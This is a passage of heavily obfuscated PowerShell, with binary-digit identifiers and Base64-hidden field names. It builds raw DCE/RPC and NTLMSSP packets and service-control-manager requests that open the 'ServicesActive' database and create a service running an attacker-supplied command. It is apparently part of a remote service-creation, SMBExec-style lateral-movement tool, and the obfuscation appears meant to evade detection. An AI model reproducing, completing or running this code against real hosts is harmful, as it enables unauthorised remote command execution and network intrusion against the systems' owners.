        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),${_10110110100010111})
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${00111010111001010})
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAWABtAGkAdABGAHIAYQBnAA=='))),[Byte[]](0xb8,0x10))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUgBlAGMAdgBGAHIAYQBnAA=='))),[Byte[]](0xb8,0x10))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBzAHMAbwBjAEcAcgBvAHUAcAA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AQwB0AHgASQB0AGUAbQBzAA=='))),${_10101111010010000})
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_10010010001101000})
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwA='))),[Byte[]](0x01))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAyAA=='))),[Byte[]](0x00))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUA'))),${_00000111111011110})
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIA'))),${_00010111001011000})
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByAA=='))),[Byte[]](0x00,0x00))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AA=='))),[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByAA=='))),[Byte[]](0x02,0x00,0x00,0x00))
        if(${_10101111010010000}[0] -eq 2)
        {
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMgA='))),[Byte[]](0x01,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAyAA=='))),[Byte[]](0x01))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMgA='))),${_00000111111011110})
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMgA='))),${_00010111001011000})
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADIA'))),[Byte[]](0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADIA'))),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADIA'))),[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif(${_10101111010010000}[0] -eq 3)
        {
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMgA='))),[Byte[]](0x01,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAyAA=='))),[Byte[]](0x01))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMgA='))),${_00000111111011110})
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMgA='))),${_00010111001011000})
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADIA'))),[Byte[]](0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADIA'))),[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADIA'))),[Byte[]](0x01,0x00,0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMwA='))),[Byte[]](0x02,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAzAA=='))),[Byte[]](0x01))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA0AA=='))),[Byte[]](0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMwA='))),${_00000111111011110})
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMwA='))),${_00010111001011000})
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADMA'))),[Byte[]](0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADMA'))),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADMA'))),[Byte[]](0x01,0x00,0x00,0x00))
        }
        if(${00111010111001010} -eq 3)
        {
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABUAHkAcABlAA=='))),[Byte[]](0x0a))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA'))),[Byte[]](0x02))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMwA='))),[Byte[]](0x00,0x00,0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x97,0x82,0x08,0xe2))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAFYAZQByAHMAaQBvAG4A'))),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }
        return ${01110010100110101}
    }
    function _10101110101101000
    {
        param([Byte[]]${_01010000101011010},[Int]${_00010111011011110},[Int]${_10101100001001111},[Int]${_10001011101110001},[Byte[]]${_01001000001010111},[Byte[]]${_10010010001101000},[Byte[]]${_00001101011101111},[Byte[]]${_00101101100100001})
        if(${_10101100001001111} -gt 0)
        {
            ${10110110110111100} = ${_10101100001001111} + ${_10001011101110001} + 8
        }
        [Byte[]]${10100110001001111} = [System.BitConverter]::GetBytes(${_00010111011011110} + 24 + ${10110110110111100} + ${_00101101100100001}.Length)
        [Byte[]]${01010110101100110} = ${10100110001001111}[0,1]
        [Byte[]]${01010000101110001} = [System.BitConverter]::GetBytes(${_00010111011011110} + ${_00101101100100001}.Length)
        [Byte[]]${10111011011111110} = ([System.BitConverter]::GetBytes(${_10101100001001111}))[0,1]
        ${10010111001100000} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x00))
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),${_01010000101011010})
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),${01010110101100110})
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),${10111011011111110})
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${_01001000001010111})
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA'))),${01010000101110001})
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_10010010001101000})
        ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAG4AdQBtAA=='))),${_00001101011101111})
        if(${_00101101100100001}.Length)
        {
            ${10010111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))),${_00101101100100001})
        }
        return ${10010111001100000}
    }
    function _01010011111111010
    {
        param ([Byte[]]${_10101010101110110},[Byte[]]${_01000000101000111})
        ${10011000110111111} = [String](1..2 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        ${10011000110111111} = ${10011000110111111}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${10011000110111111} += 0x00,0x00
        ${01111110010111001} = [String](1..2 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        ${01111110010111001} = ${01111110010111001}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${01111110010111001} += 0x00,0x00
        ${01100101011101011} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),${10011000110111111})
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),${_01000000101000111})
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),${_01000000101000111})
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAA=='))),${_10101010101110110})
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),${01111110010111001})
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAF8ATgBhAG0AZQBNAGEAeABDAG8AdQBuAHQA'))),[Byte[]](0x0f,0x00,0x00,0x00))
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAF8ATgBhAG0AZQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAF8ATgBhAG0AZQBBAGMAdAB1AGEAbABDAG8AdQBuAHQA'))),[Byte[]](0x0f,0x00,0x00,0x00))
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))),[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0xbf,0xbf))
        ${01100101011101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x3f,0x00,0x00,0x00))
        return ${01100101011101011}
    }
    function _01101100111100111
    {
        param([Byte[]]${_10000010011100111},[Byte[]]$Service,[Byte[]]${_00010111011011110},[Byte[]]$Command,[Byte[]]${_10011001110111011})
        ${00100011100000111} = [String](1..2 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        ${00100011100000111} = ${00100011100000111}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${00100011100000111} += 0x00,0x00
        ${10010001010111001} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABIAGEAbgBkAGwAZQA='))),${_10000010011100111})
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),${_00010111011011110})
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),${_00010111011011110})
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))),$Service)
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),${00100011100000111})
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),${_00010111011011110})
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),${_00010111011011110})
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))),$Service)
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0xff,0x01,0x0f,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBUAHkAcABlAA=='))),[Byte[]](0x10,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBTAHQAYQByAHQAVAB5AHAAZQA='))),[Byte[]](0x03,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBFAHIAcgBvAHIAQwBvAG4AdAByAG8AbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),${_10011001110111011})
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),${_10011001110111011})
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlAA=='))),$Command)
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBVAEwATABQAG8AaQBuAHQAZQByAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBVAEwATABQAG8AaQBuAHQAZQByADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHAAZQBuAGQAUwBpAHoAZQA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBVAEwATABQAG8AaQBuAHQAZQByADMA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBVAEwATABQAG8AaQBuAHQAZQByADQA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAFMAaQB6AGUA'))),[Byte[]](0x00,0x00,0x00,0x00))
        return ${10010001010111001}
    }
    function _00101000001101001
    {
        param([Byte[]]${_10000010011100111})
        ${10000010110001001} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10000010110001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABIAGEAbgBkAGwAZQA='))),${_10000010011100111})
        ${10000010110001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        return ${10000010110001001}
    }
    function _00110111011101100
    {
        param([Byte[]]${_10000010011100111})
        ${01011001011010110} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01011001011010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABIAGEAbgBkAGwAZQA='))),${_10000010011100111})
        return ${01011001011010110}
    }
    function _10011111000101110
    {
        param([Byte[]]${_10000010011100111})
        ${10100101111100100} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10100101111100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABIAGEAbgBkAGwAZQA='))),${_10000010011100111})
        return ${10100101111100100}
    }
function _01110001101111010
{
    ${01110111001011111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFMAeQBzAHQAZQBtAA=='))),[Byte[]](0x5c,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFUAbgBrAG4AbwB3AG4A'))),[Byte[]](0x00,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBMAGUAbgA='))),[Byte[]](0x18,0x00,0x00,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBOAHUAbABsAFAAbwBpAG4AdABlAHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBOAHUAbABsAFAAbwBpAG4AdABlAHIAMgA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBOAHUAbABsAFAAbwBpAG4AdABlAHIAMwA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x04,0x00,0x02,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAFEAbwBzAF8ATABlAG4A'))),[Byte[]](0x0c,0x00,0x00,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsAA=='))),[Byte[]](0x02,0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAEMAbwBuAHQAZQB4AHQATQBvAGQAZQA='))),[Byte[]](0x01))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQQB0AHQAcgBfAEEAdAB0AHIAXwBQAG8AaQBuAHQAZQByAFQAbwBTAGUAYwBRAG8AcwBfAEUAZgBmAGUAYwB0AGkAdgBlAE8AbgBsAHkA'))),[Byte[]](0x00))
    ${01110111001011111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    return ${01110111001011111}
}
function _10010000100100010
{
    param([Byte[]]${_01001101111110010})
    ${10001100010100111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10001100010100111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASABhAG4AZABsAGUA'))),${_01001101111110010})
    ${10001100010100111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAHYAZQBsAA=='))),[Byte[]](0x05,0x00))
    return ${10001100010100111}
}
function _10100100101101101
{
    param([Byte[]]${_01001101111110010})
    ${00011011110000011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00011011110000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASABhAG4AZABsAGUA'))),${_01001101111110010})
    return ${00011011110000011}
}
function _01000111111011111
{
    param([Byte[]]${_01001101111110010},[Byte[]]${_10000010010100100})
    ${00000101111101000} = New-Object System.Collections.Specialized.OrderedDictionary
